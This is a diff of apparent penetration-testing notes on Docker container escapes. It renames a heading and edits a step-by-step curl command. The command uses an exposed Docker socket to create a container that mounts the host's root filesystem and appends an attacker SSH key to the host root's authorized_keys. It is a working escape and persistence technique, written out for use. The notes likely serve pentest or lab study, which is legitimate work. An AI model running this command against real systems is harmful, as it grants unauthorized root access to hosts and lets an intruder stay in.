@@ -35,7 +35,7 @@ fi
 ```
 
 
-### Docker Escape Techniques
+## Docker Escaping Techniques
 
 ### Escape via Exposed Docker Daemon
 Run the following cmnd
@@ -113,7 +113,7 @@ cat key.pub
 
 STEP3: Creating a new docker container with image ID
 ```markdown
-./curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"c3:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxfoS+Yb2cW4y9cKcBWpVIiNiBXKSWMtxjY0IqeRbjwheXw5MEtMX7sIB/0cKl8W/mY4u1UeRzWOoIIew6hqlaWCW6WKeSiCrNzEEj8GMQ6/0mvqmNpc001DpNeVLCKFR9S8W8kcR7V8xzJVCqatscFjAPR3CUlOwHiLZP8h0uQNUSlkCyVY+kHgN9bHvY7t5EicqchWod5Kkjim6PR7/cEJHzxdx1FH9X08u5NQ5tCNMCt298sPba2xkWtknLYZRx0TQZWWedDk2mC0wJph2fv/Jjn1BsMtOpjH/s/mfVg28BXR3PJbJMHxFLEofonMjbeSUy0zSzOAJ0ePPVVaxGj8tydpwX3En/bgdWbnH29/eleIlUY9MhHNTRY5PDcra3emTX0nktoseZ2nazqXJYbsZ5vojcXbWA8B4f3SjESHZ8fGDWxL2+ZV+e0cliIo6GPNtPi/ZD/66vrztzP3eEW8mGP0771inrHoHXgQP0/BMcKBS2pzqct2rTQ/LfFFM= root@kali >> /var/tmp/root/.ssh/authorized_keys"]}'
+./curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"c3:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "echo ssh-rsa AAAA..............xfoS+Yb2cW4y9cKcBWpVIiNMEtMX7sIB/0cKl8W/mY4u1UeRzWOoIIew6hqlaWCW6WKeSiCrNzEEj.........................P0/BMcKBS2pzqct2rTQ/LfFFM= root@kali >> /var/tmp/root/.ssh/authorized_keys"]}'
 ```
 
 NOTE: replace "c3:latest" with the docker image name that you'll get from step1. eg: "RepoTags":["c3:latest"]
